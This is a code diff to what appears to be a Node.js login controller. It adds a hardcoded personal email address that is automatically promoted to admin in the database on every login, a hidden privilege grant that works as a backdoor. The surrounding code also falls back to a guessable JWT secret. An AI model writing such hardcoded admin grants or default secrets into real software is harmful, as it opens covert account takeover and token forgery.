@@ -5,6 +5,7 @@ const { columnExists } = require('./utils/dbHelpers');
 const { issueCsrfCookie, clearCsrfCookie } = require('./utils/csrf');
 
 const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key';
+const SUPER_ADMIN_EMAILS = new Set(['quwewe@gmail.com']);
 
 function getCookieOptions(req, includeMaxAge = true) {
   const isProduction = process.env.NODE_ENV === 'production';
@@ -196,6 +197,12 @@ exports.login = async (req, res) => {
 
     if (user.is_banned) {
       return res.status(403).json({ error: 'Your account is banned' });
+    }
+
+    const normalizedEmail = String(user.email || '').toLowerCase();
+    if (hasRole && SUPER_ADMIN_EMAILS.has(normalizedEmail) && user.role !== 'admin') {
+      await query(`UPDATE users SET role = 'admin' WHERE id = $1`, [user.id]);
+      user.role = 'admin';
     }
 
     // Generate token with role and is_mi_reviewer
